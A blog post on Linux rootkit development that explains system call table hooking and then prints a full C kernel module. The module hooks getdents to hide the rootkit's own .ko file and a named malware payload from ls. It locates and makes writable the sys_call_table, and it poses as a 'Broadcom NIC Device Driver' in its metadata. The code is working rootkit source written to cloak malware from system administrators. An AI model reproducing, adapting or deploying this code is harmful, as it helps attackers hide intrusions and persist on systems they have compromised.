---
title: 'The Art of Syscall Hooking'
categories: ['Hacking', 'Rootkits', 'Post Exploitation', 'security research']
tags: [
    'Exploit Development',
    'hacking',
    'redteaming',
    'rootkits',
    'security research',
]
date: '2020-03-28'
type: 'post'
weight: 400
keywords: 'hacking rootkits'
---

How can we have our rootkit avoid detection from prying eyes? What kinds of things do we want to hide from?
 
This time we get into the meat and bones of our rootkit and  look at hooking system calls (sys calls) to help us remain hidden from the wandering eyes of system administrators. 

## Syscall Hooking

> Note there are other types of hooking, I.E inline hooking (most windows rootkits)

Hooking is not a new concept and forms a part of normal operation in the Linux kernel. The kind of hooking we will use involves two key concepts at its most basic level; pointers and the system call table. 

In order to make useful changes that help us with our objective, for example remaining cloaked from system programs (and those who execute them) we will need to alter these functions. One way we can do this is by hooking the system call table. 

The system call table from an abstracted view is a big list which acts as a directory to kernel functions/methods, for example reading data `sys_read`, we can think of it metaphorically, and archaically, as an address book. Under each ‘entry’ in the table we can find the address, in this case that address is a pointer to the location of a function in memory. If we ‘go’ to that address under the listing we will ‘execute’ the code that is stored there. The concept of hooking therefore is that instead of a program's read call going to the system call table and ‘looking up’ the location of the read function in memory and then executing it, it instead points to our modified function in memory and executes that instead. From here we can perform near arbitrary changes to the operation of that program and return our changes to the userland program that originally triggered the call. 

As a side note the userland program does not directly go to the system call table to execute these functions, it instead has the kernel perform these calls on its behalf. Therefore our rootkit must operate as part of the kernel to see these system calls and intercept them (hooking). The following diagram illustrates the concept.  

![hooking diagrammatically](https://i.imgur.com/OhmoJim.png)

## Modified `insert` syscall

What do our modified calls actually do? The answer to that really depends on the objective of the kit, but since we are developing one to cloak our malware and itself we will focus on that notion (which should be pretty common among the vast majority of rootkits). With this in mind we want our modified calls to essentially 'dis-include' our rootkit files and our malware files (since everything is a file in Linux this includes the module file etc) and then return to the normal function as if nothing has changed ...

Here is a small fragment that will hide a “named” kernel object file (our rootkit) and other named files of our choosing from the ls command and its variants: 

```C
//Neccessary header files
#include <linux/init.h> //macros
#include <linux/module.h> 
#include <linux/syscalls.h>
#include <linux/kallsyms.h> //Call system
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h> //Kernel 


//Assists with kernel taint warnings etc
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Broadcom");
MODULE_DESCRIPTION("NIC Device Driver");
MODULE_VERSION("1.0");


unsigned long **SYS_CALL_TABLE;

//Adaptation for 5.0.3.42 and lower (CR4 pinning and CR0 bypass)
void EnablePageWriting(unsigned long address){
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);

	if(pte->pte &~ _PAGE_RW){
		pte->pte |= _PAGE_RW;
	}
}

void DisablePageWriting(unsigned long address){
	unsigned int level;

	pte_t *pte = lookup_address(address, &level);

	pte->pte = pte->pte &~ _PAGE_RW;

} 


struct linux_dirent {
	unsigned long	  d_ino;    /* Inode number */
	unsigned long	  d_off;	  /* Offset to next linux_dirent */
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		      d_name[];   // the struct value is actually longer than this, and d_name is variable width.
}*dirp2 , *dirp3 , *retn;   // // dirp = directory pointer -> Utility pointers


// ------ MALWARE DROP & Verto file hides ------ //

/* Hardcoded malware package - Rename to something 
'common'
*/
char payload[]="malware_demo_file.py";


// ------- HIDE ROOTKIT DRIVER FILE -------- //
char ko_fl[]  = "verto.ko";

//Original getdents syscall from kernel files (aka kallsym {'call system'})
asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

/*
    -- HOW THIS HIDE FUNCTION WORKS --

~> Hook the call for the read/open command
~> Point it to directory traversal code
    ~> Uses byte calculations to determine how many resources (represented by structures ) are in dir
~> Once it reaches the file to be hidden 
    ~> it 'skips' it and performs the byte arithmetic to continue normally
    ~> displaying everything else in the 
*/
  
asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  struct linux_dirent *retn, *dirp3; 
  int Records, RemainingBytes, length;

  Records = (*original_getdents) (fd, dirp, count);

  if (Records <= 0){
    return Records;
  }

  retn = (struct linux_dirent *) kmalloc(Records, GFP_KERNEL);
  //Copy struct from userspace to our memspace in kernel space
  copy_from_user(retn, dirp, Records);

  dirp3 = retn; //Holds directory pointer for current dir, used to iterate over
  RemainingBytes = Records;
  
    //While still stuff in the dir
  while(RemainingBytes > 0){
    length = dirp3->d_reclen; //len of record
    RemainingBytes -= dirp3->d_reclen; //Gives numerical representation of next struct
    
    //Debugging
    printk(KERN_INFO "RemainingBytes %d   \t File: %s " ,  RemainingBytes , dirp3->d_name );


    if((strcmp( (dirp3->d_name) , payload) == 0) || (strcmp( (dirp3->d_name) , ko_fl) == 0)){
        memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
        Records -= length; //  replaces dirp3->d_reclen;
    }

    //Shift pointer to next structure (file)
    dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);

  }
  // Copy the record back to the origional struct
  copy_to_user(dirp, retn, Records); //Return to user space (using copy_to_user macro)
  kfree(retn); //Free memory
  return Records;
}


// Set up hooks.
static int __init SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

  // Opens the memory pages to be written
	EnablePageWriting((unsigned long )SYS_CALL_TABLE);

  // Replaces Pointer Of Syscall_open on our syscall.
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
	DisablePageWriting((unsigned long )SYS_CALL_TABLE);

	return 0;
}


static void __exit HookCleanUp(void) {

	// Clean up our Hooks
	EnablePageWriting((unsigned long )SYS_CALL_TABLE);
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	DisablePageWriting((unsigned long )SYS_CALL_TABLE);
	printk(KERN_INFO "Hooks cleaned up");
}

module_init(SetHooks);
module_exit(HookCleanUp);

```